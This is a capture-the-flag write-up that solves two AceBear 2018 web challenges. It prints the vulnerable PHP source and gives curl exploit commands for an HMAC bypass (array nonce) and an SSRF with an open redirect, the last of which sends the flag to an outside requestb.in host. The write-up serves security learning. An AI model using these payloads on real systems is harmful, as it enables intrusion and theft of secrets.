# BearShare 1 & 2

BearShare 1 and 2 were two 100 point challenges based on the same code in the
AceBear Security Contest 2018. Although they have been flagged by quite a large
number of teams, they were quite interesting and deserve a writeup. They will
be solved in order, so if you're only interested in the solution of BearShare 2,
you can easily skip the whole first part of the writeup.

# Challenge description

### BearShare

```
Description: I have an idea, I want to change the way we communicate.
Website: http://35.198.201.83/
```

### BearShare 2

```
Description: Well, there is one more thing. After get flag in level 1, try to discover 1 more.
Website: http://35.198.201.83/
```

## BearShare

After solving the **welcome** Web challenge of the same CTF, we decide to check
if we can find interesting information in `/robots.txt` right away. This
displays the following:

```
User-agent: *
Disallow: /backup_files
```

### Backup files

`/backup_files` contains two files: `download.txt` and `index.txt`. We download
both of them right away.

We quickly check the website and realize that it only contains two accessible
pages, `index.php` and `download.php`. I think it is safe to assume that we
possess the whole relevant source code of the website at this point.

`index.txt` contains the following PHP code:

```php
<?php
    if(isset($_POST['message'])){
        $message = (string)$_POST['message'];
        $rand_id = rand(1000000000, 9999999999).'salt^&#@!'.rand(1000000000, 9999999999);
	$messid = md5($rand_id);
	$store_location = rand(0,10);
	if($store_location%2===0){
		file_put_contents('/var/www/messagestore/'.$messid,$message);
	} else {
		file_put_contents('/var/www/messagestore2/'.$messid,$message);
	}
    }
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">

    <title>BearShare</title>

    <!-- Bootstrap core CSS -->
    <link href="dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <style>
            /* Sticky footer styles
        -------------------------------------------------- */
        html {
        position: relative;
        min-height: 100%;
        }
        body {
        /* Margin bottom by footer height */
        margin-bottom: 60px;
        }
        .footer {
        position: absolute;
        bottom: 0;
        width: 100%;
        /* Set the fixed height of the footer here */
        height: 60px;
        line-height: 60px; /* Vertically center the text there */
        background-color: #f5f5f5;
        }


        /* Custom page CSS
        -------------------------------------------------- */
        /* Not required for template or sticky footer method. */

        body > .container {
        padding: 60px 15px 0;
        }

        .footer > .container {
        padding-right: 15px;
        padding-left: 15px;
        }

        code {
        font-size: 80%;
        }
    </style>
  </head>

  <body>

    <header>
      <!-- Fixed navbar -->
      <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
        <a class="navbar-brand" href="#">BearShare</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarCollapse">
          <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
              <a class="nav-link" href="index.php">Create message<span class="sr-only">(current)</span></a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="download.php">Get message</a>
            </li>
          </ul>
        </div>
      </nav>
    </header>

    <!-- Begin page content -->
    <main role="main" class="container">
      <div class="mt-3">
        <h1>BearShare</h1>
        <h3><i>Private message sharing</i></h3>
      </div>
      <p class="lead">Need a dumb way to share your private message? Use BearShare!</p>
      <?php if(isset($messid)){ $at="";if($store_location%2===0){ $at="message1.local";}else{$at="message2.local";} ?>
      <p>Your message stored at server: <code><?php echo $at; ?></code></p>
      <p>Your message's ID: <code><?php echo $messid; ?></code></p>
      <?php } ?>
        <form class="form-signin" method="POST" action="index.php">
            <input type="text" placeholder="Your private message" class="form-control" name="message"/>
            <button class="btn btn-lg btn-primary btn-block" style="max-width:300px;margin:auto;margin-top:30px;" type="submit">Create</button>
        </form>
    </main>

    <footer class="footer">
      <div class="container">
        <span class="text-muted">Content © 2018 - AceBear</span>
      </div>
    </footer>

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
    <script src="assets/js/vendor/popper.min.js"></script>
    <script src="dist/js/bootstrap.min.js"></script>
  </body>
</html>
```

and `download.txt` contains the following PHP code:

```php
<?php
    include_once 'config.php';
    $nonce = md5(rand(10000000, 99999999).rand(10000000, 99999999));

    function gen_hash($n, $sv){
	$first = hash_hmac('sha256',$n,$S_KEY);
	return hash_hmac('sha256',$sv,$first);
    }

    function validate_hash(){
	if(empty($_POST['hash']) || empty($_POST['storagesv'])){
            die('Cannot verify server');
        }
        if(isset($_POST['nonce'])){
            $S_KEY = hash_hmac('sha256',$_POST['nonce'],$S_KEY);
        }
        $final_hash = hash_hmac('sha256',$_POST['storagesv'],$S_KEY);
        if ($final_hash !== $_POST['hash']){
            die('Cannot verify server');
	}

    }

    function filter($x){
        $x = (string)$x;
        if(preg_match('/http|https|\@|\s|:|\/\//mi',$x)){
            return false;
        }
        return $x;
    }


    if(isset($_POST['messid'])){

	$messid = $_POST['messid'];
	validate_hash();
	$url="";
	if($_POST['storagesv'] === 'message1.local' or $_POST['storagesv'] === 'message2.local'){
		$url = 'http://'.$_POST['storagesv'].'/';
	} elseif ($_POST['storagesv']==="gimmeflag") {
		die('AceBear{******}');
	}

	$messid = filter($messid);

	if($messid){
	  $url .= $messid;
          $out = shell_exec('/usr/bin/python '.$BROWSER_BOT.' '.escapeshellarg('http://route.local/?url='.urlencode($url)).' 2>&1');
        } else {
            die('Hey, are you a haxor?');
        }
    }

?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">

    <title>BearShare</title>

    <!-- Bootstrap core CSS -->
    <link href="dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <style>
            /* Sticky footer styles
        -------------------------------------------------- */
        html {
        position: relative;
        min-height: 100%;
        }
        body {
        /* Margin bottom by footer height */
        margin-bottom: 60px;
        }
        .footer {
        position: absolute;
        bottom: 0;
        width: 100%;
        /* Set the fixed height of the footer here */
        height: 60px;
        line-height: 60px; /* Vertically center the text there */
        background-color: #f5f5f5;
        }


        /* Custom page CSS
        -------------------------------------------------- */
        /* Not required for template or sticky footer method. */

        body > .container {
        padding: 60px 15px 0;
        }

        .footer > .container {
        padding-right: 15px;
        padding-left: 15px;
        }

        code {
        font-size: 80%;
        }
    </style>
  </head>

  <body>

    <header>
      <!-- Fixed navbar -->
      <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
        <a class="navbar-brand" href="#">BearShare</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarCollapse">
          <ul class="navbar-nav mr-auto">
            <li class="nav-item">
              <a class="nav-link" href="index.php">Create message</a>
            </li>
            <li class="nav-item active">
              <a class="nav-link" href="download.php">Get message <span class="sr-only">(current)</span></a>
            </li>
          </ul>
        </div>
      </nav>
    </header>

    <!-- Begin page content -->
    <main role="main" class="container">
    <div class="mt-3">
      <h1>BearShare</h1>
      <h3><i>Private message sharing</i></h3>
    </div>
    <p class="lead">Need a dumb way to share your private message? Use BearShare!</p>
      <?php if(isset($out)){ ?>
      <xmp style="background: #f8f9fa;overflow-x:scroll;padding:10px;max-height:500px">
<?php echo $out; ?>
</xmp>
      <?php } ?>
	<form class="form-signin" method="POST" action="download.php">
		<input type="hidden" name="nonce" value="<?php echo $nonce; ?>"/>
		<input type="hidden" name="hash" value=""/>
		<div class="form-row">
			<div class="form-group col-md-3">
			    <select class="form-control ss" name="storagesv">
			      <option disabled selected value>-- Storage server --</option>
			      <option value="message1.local">message1.local</option>
			      <option value="message2.local">message2.local</option>
			    </select>
			</div>
			<div class="form-group col-md-9">
			    <input type="text" class="form-control" name="messid"/>
			</div>

            <button class="btn btn-lg btn-primary btn-block" style="max-width:300px;margin:auto;margin-top:30px;" type="submit">Read message</button>
        </form>
    </main>

    <footer class="footer">
      <div class="container">
        <span class="text-muted">Content © 2018 - AceBear</span>
      </div>
    </footer>

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
    <script src="assets/js/vendor/popper.min.js"></script>
    <script src="dist/js/bootstrap.min.js"></script>
    <script>
    	$( ".ss" ).change(function() {
		if($(".ss").val() == "message1.local"){
			$("input[name='hash']").val("<?php echo gen_hash($nonce, 'message1.local'); ?>");
		} else if($(".ss").val() == "message2.local"){
			$("input[name='hash']").val("<?php echo gen_hash($nonce, 'message2.local'); ?>");
		} else {
			"None";
		}
	});
    </script>
  </body>
</html>
```

One condition of `download.txt` immediately catches the eye:

```php
if($_POST['storagesv'] === 'message1.local' or $_POST['storagesv'] === 'message2.local'){
    $url = 'http://'.$_POST['storagesv'].'/';
} elseif ($_POST['storagesv']==="gimmeflag") {
    die('AceBear{******}');
}
```

Seems like we know where to look!

### Reversing the application

In order to display the flag, we need to provide the parameter
`storagesv=gimmeflag` in a POST request. This condition is only checked if
`isset($_POST['messid'])` evaluates to `True`, which means we must provide
the parameter `messid` as well.

Between these two checks, the function `validate_hash()` is called. Let's
check its code:

```php
function validate_hash(){
    if(empty($_POST['hash']) || empty($_POST['storagesv'])){
        die('Cannot verify server');
    }
    if(isset($_POST['nonce'])){
        $S_KEY = hash_hmac('sha256',$_POST['nonce'],$S_KEY);
    }
    $final_hash = hash_hmac('sha256',$_POST['storagesv'],$S_KEY);
    if ($final_hash !== $_POST['hash']){
        die('Cannot verify server');
    }
}
```

First, it checks whether the `hash` parameter and the `storagesv` parameter
exist, and terminates if they don't. Therefore, we need to pass a `hash`
parameter in our POST request as well, which looks like this so far:
`storagesv=gimmeflag&hash=randomvalue1&messid=randomvalue2`.

After that, it checks whether the parameter `nonce` is set, and hashes it using
`hash_hmac` with a secret key. This secret key then becomes the result of this
computation. If `nonce` is not provided through the parameters, the program
just skips the condition and keeps running. We don't **need** to pass a `nonce`
parameter in our request, but we **can**, which will probably come in handy.

Then, the value of our `storagesv` parameter is hashed using the previously
evoked secret key.

Finally, this hash is compared to the `hash` parameter from our request. If
these two hashes match, the function results normally.

### What we should aim for

Because we want to predict the value of `$final_hash`, we have to be able to
control the value of `$S_KEY` during the second call to `hash_hmac`. The only
way to do that is by finding a way to manipulate the output of
`hash_hmac('sha256',$_POST['nonce'],$S_KEY);`.

### What's the vulnerability?

The vulnerability is not obvious here, and requires a bit of knowledge about
the specification of the `hash_hmac` function in PHP. It is no use looking
into the `hash_hmac` algorithm as it is still cryptographically secure for
now.

While we are able to set the value of `$S_KEY` by setting the `nonce` parameter,
there is no way of controlling the output of `hash_hmac` to set `$S_KEY` to
a predictable value, since a secret key is used in the function call…
Or is there?

The value of `$_POST['nonce']` really doesn't provide any way of predicting the
output of `hash_hmac` if we don't know the secret key used. However, the value
of `$_POST['nonce']` isn't the only characteristic of the parameter we can
control: we also control its **type**.

`hash_hmac` works well when its second parameter is a string, but what if it
is an array for example?

```php
php > hash_hmac("sha256", array(1), "secret");
PHP Warning:  hash_hmac() expects parameter 2 to be string, array given in php shell code on line 1
```

We get **a warning**! But… a warning is not an error, so what is the output
of the function? Well, it is **NULL**.

```php
php > print_r(hash_hmac("sha256", array(1), "secret") == NULL);
PHP Warning:  hash_hmac() expects parameter 2 to be string, array given in php shell code on line 1
1
```

So, if we make `$_POST['nonce']` an array, we should be able to pass any string
in `$_POST['storagesv']` provided `$_POST['hash']` contains
`hash_hmac("sha256", $_POST['storagesv'], NULL)`.

### Wrapping up

We issue the following curl request:

```bash
curl -X POST --data "nonce[]=lol&nonce[]=lol&messid=lol&storagesv=gimmeflag&hash=028cf6abf024b107104bc69d844cd3e70755cf2be66b9ab313ca62f9efdcf769" http://35.198.201.83/download.php
```

and we obtain the first flag: `AceBear{b4d_Hm4C_impl3M3nt4t10N}`!!

## BearShare 2

Of course, we spotted another interesting piece of code in **BearShare**:

```php
if($messid){
    $url .= $messid;
    $out = shell_exec('/usr/bin/python '.$BROWSER_BOT.' '.escapeshellarg('http://route.local/?url='.urlencode($url)).' 2>&1');
} else {
    die('Hey, are you a haxor?');
}
```

Any call to `shell_exec` in a CTF obviously reeks of exploitation potential.
So, what's up with that?

### Reversing the application

We can pretty much keep a big part of our payload here. If `$messid` is set
after going through a filter, it is concatenated to `$url`, a variable that is
then used to… do something, we don't know what yet; it would seem natural that
it is designed to visit the page at `$url`.

`$url` is set in the previous condition to the value of `$_POST['storagesv']`
if it is **message1.local** or **message2.local**. Otherwise, it is left empty,
and we can therefore control it completely using `$messid`.

After checking with the values `storagesv=lol`,
`hash=ed094d614919a055e78dc191fb658b9b0e7b24d0d05eb421211eecdc37ebb566`
and `messid=lol`, we get a page containg the following output:

```html
<xmp style="background: #f8f9fa;overflow-x:scroll;padding:10px;max-height:500px">
<!DOCTYPE html PUBLIC "-//IETF//DTD HTML 2.0//EN"><html xmlns="http://www.w3.org/1999/xhtml"><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /lol was not found on this server.</p>
<hr />
<address>Apache/2.4.27 (Ubuntu) Server at route.local Port 80</address>
</body></html>
</xmp>
```

This is an SSRF, alright.

### Exploitation

So, this looks like it has the potential for a SSRF. The filter function is
quite permissive. We're not sure of what we're looking for though, so we're
going to apply the golden rule we learned in this CTF: **check robots.txt**.

We run the following command:

```bash
curl -X POST --data "messid=robots.txt&nonce[]=lol&nonce[]=lol&storagesv=lol&hash=ed094d614919a055e78dc191fb658b9b0e7b24d0d05eb421211eecdc37ebb566" http://35.198.201.83/download.php
```

and we get the following output:

```
<xmp style="background: #f8f9fa;overflow-x:scroll;padding:10px;max-height:500px"><html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">User-agent: * Disallow: /index_09cd45eff1caa0e.txt </pre></body></html></xm
```

Ok, let's check `/index_09cd45eff1caa0e.txt`:

```bash
curl -X POST --data "messid=index_09cd45eff1caa0e.txt&nonce[]=lol&nonce[]=lol&storagesv=lol&hash=ed094d614919a055e78dc191fb658b9b0e7b24d0d05eb421211eecdc37ebb566" http://35.198.201.83/download.php
```

This outputs:

```
<xmp style="background: #f8f9fa;overflow-x:scroll;padding:10px;max-height:500px">
<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">&lt;?php
        if(isset($_GET['url'])){
                        $url = (string)$_GET['url'];
                        header('Location: '.$url.'?flag=***SECRET***:');
        }
?&gt;
</pre></body></html>
</xmp>
```

We figure out that this is a backup of `/index.php` on the local server
`route.local`. Basically, passing a `url` parameter to the request to this file
will send the flag to the server it points to.

In order to exfiltrate it, we need to pass a URL we control as a parameter; it
does not need to be prefixed with `http://` but at least by `//`, which is
a pattern that is filtered by the `filter` function.

It seems quite obvious to try double encoding one of the slashes here and, after
executing

```php
curl -X POST --data "nonce[]=lol&nonce[]=lol&storagesv=lol&hash=ed094d614919a055e78dc191fb658b9b0e7b24d0d05eb421211eecdc37ebb566&messid=index.php%3Furl=%252F/requestb.in/zmecxqzm" http://35.198.201.83/download.php
```

We obtain the flag in our bin: `AceBear{A_w4Y_t0_tr1cK_oP3n_r3Dir3cT}`!!

## Conclusion

Those two challenges were very interesting, and I had a lot of fun beating them.
Thanks a lot to the organizing team for making such a cool CTF!
